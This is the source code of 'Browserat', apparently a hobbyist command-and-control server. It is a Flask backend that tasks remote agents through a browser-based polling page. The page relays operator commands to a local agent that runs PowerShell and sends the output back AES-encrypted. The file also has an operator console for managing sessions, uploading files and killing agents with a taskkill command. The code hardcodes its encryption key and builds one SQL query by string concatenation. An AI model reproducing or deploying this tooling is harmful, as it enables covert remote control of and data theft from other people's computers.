# -*- coding: utf-8 -*-
#!/bin/usr/python
from flask import Flask
from flask import request
import logging
import readline
import thread
import sys 
import urllib
import base64
import threading
import time as t
import os
import signal
from multiprocessing import Process
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, date, time, timedelta
import hashlib
from tabulate import tabulate
from Crypto import Random
from Crypto.Cipher import AES

class cryptor:
    def __init__( self, key ):
        H = hashlib.sha1(); H.update(key)
        self.pad = lambda self, s: s + (self.BS - len(s) % self.BS) * "\x00"
        self.unpad = lambda self, s : s.rstrip('\x00')
        self.toHex = lambda self, x:"".join([hex(ord(c))[2:].zfill(2) for c in x])
        self.BS = 16
        self.key = H.hexdigest()[:32]
    def encrypt( self, raw ):
        raw = self.pad(self, raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return self.toHex(self, iv + cipher.encrypt( raw ) )
    def decrypt( self, enc ):
        enc = (enc).decode("hex_codec")
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return self.unpad(self, cipher.decrypt( enc[16:] ))

# Constants
LOCALHOST_ADDRESS = "http://localhost:8899/do" #Browserat client-side web-server for OS command execution
DB_LOCATION = 'sqlite:///browserat.sqlite3'

TITLE = """\n
    Browserat v1.1.2
    The brainchild of Dor Tumarkin, I took BrowseRat as a POC and created a full Command & Control system.
        New features include: 
            Payloads are AES enctypted before being sent on the wire
            Sessions for multiple agent connections 
            Agent management (Add nicknames, kill sessions, or remove dead sessions)
            File upload functionality
            Back-end code updated
            Agent payload updated to run smoother and not require hard-coded paths for FireFox
        Current Issues:
            The agent dies terribly when it can't connect to the back-end
            AES implementation works but is heavy. 
            Uploading 'works' but is funky and can take time to decrypt and Cerutil it to file
            Probably a lot more...
        ToDo:
            Upgrade to Python3 (Some issues exist with current implentation of AES and Python3)
            Implement SSL (not really necesary since all data is AES encypted)
            Build webapp interface
            Add notifications of new agent connections
            Minor back-end tweaks
            Automatic agent configure deployment
            Add agent checks for browsers, interent connections, and back-end as well as agent not dying when it cant find any of them.
            Add comments to code like a good little dev
 """[1:]
HELP_BLOB = """    Available Options:
    Help                | Show help screen
    List                | Show all sessions
    Sessions            | List sessions and chose agent to control
    Nickname            | Change agent key to easilty identifiable nickname
    Upload              | Upload files to the same directory the agent is located in
    Kill                | Kill active sessions
    Remove              | Remove dead sessions from list
    History             | Show last 10 commands
    History <from> <to> | Show range of history entries 
    Clear_history       | Clear all history (prompts for confirmation)
    
    ; - prefix, anything after semicolon will be executed as PowerShell code
"""

# Main definitions
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = DB_LOCATION
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = 'e5ae3c8c-f0bf-11e5-9e33-d3b532c10628'
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
db = SQLAlchemy(app)
readline.parse_and_bind("tab: complete")
cipher = cryptor('e5ae3c8c-f0bf-11e5-9e33-d3b532c10628')

#Globals & Flags
command = ""
key = ""
ksession = ""
SESSION = ''

# Server functions
def run_server():
    global app
    app.run(host='0.0.0.0', port=80, threaded=True, debug=False, use_reloader=False)

# SQLAlchemy Models
class History(db.Model):
    __tablename__ = 'HistoryTbl'

    id = db.Column(db.Integer, primary_key=True)
    command = db.Column(db.String())
    output = db.Column(db.String())
    time = db.Column(db.String())
    agent = db.Column(db.String())

    def __init__(self, command=None, output=None, agent=None, time=None):
        self.command = command
        self.output = output.replace("\x00", "")
        self.time = time
        self.agent = request.form['key']

    def __repr__(self):
        return "[*] Histroy ID: [" + str(self.id) + "] | " + "Agent ID: " + self.agent + " | Time Run: " + self.time + "\n\nCommand: " + self.command + "\nResult:" + self.output 

class Sessions(db.Model):
    __tablename__ = 'SessionsTbl'
    id = db.Column(db.Integer, primary_key=True)
    agent = db.Column(db.String(), unique=True)
    nickname = db.Column(db.String())
    firstseen = db.Column(db.String())
    lastseen = db.Column(db.String())
    status = db.Column(db.String())

    def __init__(self, agent=None, firstseen=None):
        self.agent = agent
        self.nickname = ''
        self.firstseen = firstseen
        self.lastseen = ''
        self.status = 1
    
    def __repr__(self):
        now = datetime.now()
        start = datetime.strptime(now.strftime("%Y-%m-%d %H:%M:%S"), "%Y-%m-%d %H:%M:%S")
        end = datetime.strptime(self.lastseen, "%Y-%m-%d %H:%M:%S")
        duration = start - end
        if self.nickname:
            agent_id = self.nickname
        else:
            agent_id = self.agent
        if duration.total_seconds() > 300:
            return "[*] Sessions ID: [" + str(self.id) + "] | " + "Agent ID/nickname: " + agent_id + " | [X] Agent not active for more than 5 minutes (" + str(duration.total_seconds()).replace('.0','') + " seconds ago)"
        else:
            return "[*] Sessions ID: [" + str(self.id) + "] | " + "Agent ID/nickname: " + agent_id + " | [O] Recently active agent " 
         
###### Working cookie routes. Not sure I want to implement yet
# import numpy as np
# from flask import redirect
# @app.route('/control/cookie/')
# def cookie():
#   # if 'token' in request.cookies:
#       # resp = redirect("http://192.168.0.8/control/controller")
#       # return resp
#   # else:
#       # expire_date = now + timedelta(days=90)
#       # token = str(np.random.randint(10**8, 10**9)).encode('utf-8')
#       # hashed_token = hashlib.sha256(token).hexdigest()
#       # resp = redirect("http://192.168.0.8/control/controller")
#       # resp.set_cookie('token', token, expires=expire_date)
#   # return resp
#
# @app.route('/control/delete-cookie/')
# def delete_cookie():
#   # res = make_response("Cookie Removed")
#   # res.set_cookie('token', COOKIE, max_age=0)
#   # return res
#
# @app.route('/control/getcookie')
# def getcookie():
#  # name = request.cookies.get('token')
#  # return '<h1>welcome '+name+'</h1>'
###################################################################

@app.route("/control/controller/<agentid>")
def index1(agentid):
    count = db.session.query(Sessions.agent).all()
    ids = []
    for item in count:
        ids.append(str(item.agent))
    if ids.count(agentid) == 0:
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d %H:%M:%S")
        new_history = Sessions(agentid, current_time)
        db.session.add(new_history)
        db.session.commit()
    else:
        Sessions.query.filter_by(agent=agentid).update(dict(status = 1))
        db.session.commit()
    try:
        newsession = db.session.execute('select lastseen from SessionsTbl where agent =' + "'" + agentid + "'").scalar()
        if newsession == '':
            now = datetime.now()
            Sessions.query.filter_by(agent=agentid).update(dict(firstseen = now.strftime("%Y-%m-%d %H:%M:%S")))
            db.session.commit()
    except Exception as e:
        # db.session.rollback()
        print(e)
    global key
    return """<meta charset="UTF-8">
<script src="/static/jquery-3.0.0.min.js"></script>

<script>
$.ajaxSetup ({
    // Disable caching of AJAX responses */
    cache: false
});
var cmd = "";
function execute () {
    const Http = new XMLHttpRequest();
    const url=\"""" + LOCALHOST_ADDRESS + """";
    Http.open("POST", url);
    Http.setRequestHeader('Content-Type', 'multipart/form-data');
    Http.send((encodeURI(cmd)));
    
    Http.onreadystatechange = (e) => {
        if (Http.readyState === 4) {
            b64d = Http.responseText;
            b64c = cmd;
            $.post("/control/output/""" + agentid + """", {'command' : encodeURI(b64c), 'output': encodeURI(b64d), 'key': '""" + agentid + """'});
        }
    }
}

setInterval(function() {
    $.get("/control/command/""" + agentid + """", function( data ) {
        var new_cmd = data;
        if (new_cmd != "") {
            cmd = new_cmd ;
            execute();
        }
    });}
, 1000);
</script>"""

# Issues commands to agent (commands issued by prompt)
@app.route("/control/command/<disp_command>")
def index2(disp_command):
    global ksession
    global command
    global cipher
    global key
    # print(command)
    # print(key)
    if ksession == "kill" and key == disp_command:
        if command:
            command = command + ":" + disp_command
            output = base64.b64encode(command.encode("utf-8"))
            c = cryptor(cipher)
            output = c.encrypt(output.encode("utf-8"))
            command = ""
            ksession = ""
            key = ""
            return output
    else:
        try:
            now = datetime.now()
            heartbeat = Sessions.query.filter_by(agent=disp_command).update(dict(lastseen = now.strftime("%Y-%m-%d %H:%M:%S")))
            db.session.commit()
        except Exception as e:
            print(e)
        if disp_command == key:
            if command and key:
                command = command + ":" + key
                output = base64.b64encode(command.encode("utf-8"))
                output = cipher.encrypt(output.encode("utf-8"))
                command = ""
            else:
                output = command
                command = ""
            return output
        elif disp_command != key:
            blank = ""
            return blank

# Captures command output from agent
@app.route("/control/output/<cmdoutput>", methods=['POST'])
def index3(cmdoutput):
    if request.method == 'POST' and cmdoutput:
        clear_cli_stdout()
        try:
            raw_cmd = request.form['command']
            decrypted = cipher.decrypt(raw_cmd)
            raw_command = base64.b64decode(decrypted)
            in_command = raw_command.decode("utf-8").replace('\x00','')
            new_in_command = in_command.split(':')
            raw_resp = request.form['output']
            decrypted = cipher.decrypt(raw_resp)
            raw_output = base64.b64decode(decrypted)
            in_output = raw_output.decode("utf-8").replace('\x00','')
            now = datetime.now()
            current_time = now.strftime("%Y-%m-%d %H:%M:%S")
            new_history = History(new_in_command[0], in_output, cmdoutput, current_time)
            db.session.add(new_history)
            db.session.commit()
            table = [[in_output]]
            output = tabulate(table, tablefmt='grid')
            print("\n" + output)
            sys.stdout.write(BROWSERAT_PROMPT)
            sys.stdout.flush()
        except Exception as e:
            print(str(e))
    return "<H1>Done</H1>"
######## add error correcting here ^ ? 

# Clear prompt if printing to screen
def clear_cli_stdout():
    CURSOR_UP_ONE = '\x1b[1A'
    ERASE_LINE = '\x1b[2K'
    print(CURSOR_UP_ONE + ERASE_LINE)

# List session history
def list_sessions(usercommand):
    # if (usercommand.strip().lower() == "sessions"):
    print("\nAvailable sessions: ")
    for item in Sessions.query.filter_by(status=1):
        print(item)
    print("\n")
    sys.stdout.flush()

# Remove unused sessions from list
def remove_sessions(set_session):
    global ksession
    if ksession == 'kill':
        Sessions.query.filter_by(id=set_session).update(dict(status = 0))
        db.session.commit()
        # print("Agent " + set_session + " has been removed")
    else:
        if (usercommand.strip().lower() == "remove"):
            print("\nAvailable sessions: ")
            for item in Sessions.query.filter_by(status=1):
                print(item)
            set_session = raw_input("\nType id number for the dead agent you want to remove or type 'back' to go back\nBRAT - Remove> ")
            count = db.session.query(Sessions.id).filter_by(status=1).all()
            ids = []
            for item in count:
                ids.append(str(item.id))
            try:
                if set_session == 'back':
                    sys.stdout.flush()
                elif ids.count(set_session) > 0:
                    
                    Sessions.query.filter_by(id=set_session).update(dict(status = 0))
                    db.session.commit()
                    print("Agent " + set_session + " has been removed")
                else:
                    print('\nInvalid input. Try again')
                    kill_sessions('kill_sessions')
            except:
                print('\nInvalid input. Try again')
                kill_sessions('kill_sessions')

# Kill unnecessary sessions            
def kill_sessions(usercommand):
    if (usercommand.strip().lower() == "kill"):
        print("\nAvailable sessions: ")
        for item in Sessions.query.filter_by(status=1):
            print(item)
        set_session = raw_input("\nType id number for agent you want to kill or type 'back' to go back\nBRAT - kill> ")
        count = db.session.query(Sessions.id).filter_by(status=1).all()
        ids = []
        for item in count:
            ids.append(str(item.id))
        try:
            if set_session == 'back':
                sys.stdout.flush()
            elif ids.count(set_session) > 0:
                kill_session = raw_input("\nAre you sure you want to kill the agent?\n(Agent and agent history will not be removed from database.)\n Type 'yes/no' or 'y/n'\nBRAT - kill> ")
                if kill_session.lower() == "yes" or kill_session.lower() == "y":
                    global command
                    global key
                    global ksession
                    new_session = Sessions.query.get(set_session)
                    key = new_session.agent
                    command = 'taskkill /F /IM 1.exe /IM firefox.exe'
                    ksession = "kill"
                    remove_sessions(set_session)
                    index2(None)
                    print("Kill command sent and agent removed")
            else:
                print('\nInvalid input. Try again')
                kill_sessions('kill_sessions')

        except:
            print('\nInvalid input. Try again')
            kill_sessions('kill_sessions')
        sys.stdout.flush()

#Upload files to the agent
def file_upload(usercommand):
    if (usercommand.strip().lower() == "upload"):
        print('\nLarge uploads may take a lot of time to decode and convert to file on agent end.')
        upload_f = raw_input("Choose a file to upload. File must be located in same directory as BrowseRat\nBRAT [" + SESSION + "] - Upload> ")
        global command
        global key
        try:
            f = open(upload_f, "r")
            output = base64.b64encode(f.read())
            filename = raw_input("Choose a name for the file on agent end. Press 'Enter' for current filename\nBRAT [" + SESSION + "] - Upload> ")
            if filename == '':
                if "/" in upload_f:
                    filename = upload_f.split('/')[-1]
                elif "\\" in upload_f:
                    filename = upload_f.split('\\')[-1]
                else:
                    filename = upload_f
            else:
                filename = filename
            print(filename)
            filename = base64.b64encode(filename)    
            command = output + "|" + filename
            index2(None)
        except Exception as e:
            print(str(e))
            sys.stdout.flush()
        sys.stdout.flush()

# Give connections an easily identifiable name instead of UUID
def change_nickname(usercommand):
    if (usercommand.strip().lower() == "nickname"):
        print("\nChoose a session to add/change a nickname: ")
        for item in Sessions.query.filter_by(status=1):
            print(item)
        set_session = raw_input("\nType id number for agent you want to change/add a nickname or type 'back' to go back\nBRAT - Nickname> ")
        count = db.session.query(Sessions.id).filter_by(status=1).all()
        ids = []
        for item in count:
            ids.append(str(item.id))
        try:
            if set_session == 'back':
                sys.stdout.flush()
            elif ids.count(set_session) > 0:
                set_nick = raw_input("Type the nickname to assign to session" + set_session + "\nBRAT - Nickname> ")
                changenick = Sessions.query.filter_by(id=set_session).update(dict(nickname = set_nick))
                db.session.commit()
                print("Agent " + set_session + " nickname changed to: " + set_nick)
            else:
                print('Invalid input. Try again')
                display_sessions('sessions')
        except:
            print('Invalid input. Try again')
            display_sessions('sessions')
        sys.stdout.flush()

# Main function to show current functions    
def display_sessions(usercommand):
    if (usercommand.strip().lower() == "sessions"):
        print("\nCurrent Sessions:")
        for item in Sessions.query.filter_by(status=1):
            print(item)
        set_session = raw_input("\nType id number for agent you want to control or type 'back' to go back\nBRAT - Sessions> ")
        count = db.session.query(Sessions.id).filter_by(status=1).all()
        ids = []
        for item in count:
            ids.append(str(item.id))
        try:
            global SESSION
            global key
            if set_session == 'back':
                sys.stdout.flush()
            elif ids.count(set_session) > 0:
                new_session = Sessions.query.get(set_session)
                key = new_session.agent
                SESSION = set_session
            else:
                print('Invalid input. Try again')
                display_sessions('sessions')
        except:
            print('Invalid input. Try again')
            display_sessions('sessions')
        sys.stdout.flush()
    
# Display History
# history - displays last 5 entries
# history <int> - display entry <int>
# history <start> <finish> - display entries between <start> and <finish>
def display_history(usercommand):
    if (usercommand.strip().lower() == "history"):
    
        print("Last 5 commands:")
        for item in History.query.all()[-5:]:
            table = [[item]]
            output = tabulate(table, tablefmt='grid')
            print(output)
    else:
        vars = usercommand.strip().lower().split(" ",1)[1]
        # Get range of records
        if " " in vars:
            start, end = vars.split(" ", 1)
            try:
                start = int(start)
                end = int(end)
                print("History between " + str(start) + " and " + str(end) + " commands:")
                output = History.query.filter(History.id>=start, History.id<=end).all()
                if output:
                    for item in output:
                        print(item)
                else:
                    print("No history found in this range")
            except ValueError as e:
                print("Not a valid number!")
            except Exception as e:
                print(str(e))
        # Get specific History record
        else:
            try:
                record = int(vars)
                output = History.query.filter(History.id==record).first()
                if output is not None:
                    print(output)
                else:
                    print("Entry " + str(record) + " not found in history")
            except Exception as e:
                print(str(e))
    sys.stdout.flush()

# Delete history
def delete_history():
    delete = raw_input("Type 'YES' to confirm deletion of history\nBRAT> ")
    if (delete == "YES"):
        db.session.query(History).delete()
        db.session.commit()
        print("History deleted.")
    else:
        print("History NOT deleted.")

# Main
if __name__ == "__main__":
    db.create_all()
    server_proc = threading.Thread(target=run_server)
    server_proc.start()
    # Title+Help
    print(TITLE)
    print(HELP_BLOB)
    try:
        # CLI Loop
        while (True):
            if SESSION == '':
                BROWSERAT_PROMPT = "BRAT> "
            else:
                BROWSERAT_PROMPT = "BRAT [" + SESSION + "]> "
            # global BROWSERAT_PROMPT
            usercommand = raw_input(BROWSERAT_PROMPT)
            if (usercommand.strip().lower().split(" ",1)[0] == "history" ):
                display_history(usercommand)
            elif (usercommand.strip().lower().split(" ",1)[0] == "sessions" ):
                display_sessions(usercommand)
            elif (usercommand.strip().lower() == "clear_history" or usercommand.strip().lower() == "delete_history"):
                delete_history()
            elif (usercommand.strip().lower() == "help"):
                print(HELP_BLOB)
            elif (usercommand.strip().lower() == "nickname"):
                change_nickname("nickname")
            elif (usercommand.strip().lower() == "list"):
                list_sessions("list")
            elif (usercommand.strip().lower() == "kill"):
                kill_sessions("kill")
            elif (usercommand.strip().lower() == "remove"):
                remove_sessions("remove")
            elif (usercommand.strip().lower() == "upload"):
                if SESSION:
                    file_upload("upload")
                else:
                    print("\nPlease select a session first\n")
            elif (usercommand.strip().lower() == "back"):
                key = ''
                SESSION = ''
                sys.stdout.flush()
            else :
                if key == '':
                    print("\nPlease choose a session before sending any commands or type 'help' for more information")
                    display_sessions('sessions')
                else:
                    command = usercommand

    except KeyboardInterrupt:
        print('\r\nExitting...\r\n')
        db.session.close_all()
        os.kill(os.getpid(), signal.SIGTERM) #Flask is great, but its documented method for shutdown is broken when threads are involved
    except Exception as e:
        print(e)
        db.session.close_all()
        os.kill(os.getpid(), signal.SIGTERM) #Flask is great, but its documented method for shutdown is broken when threads are involved
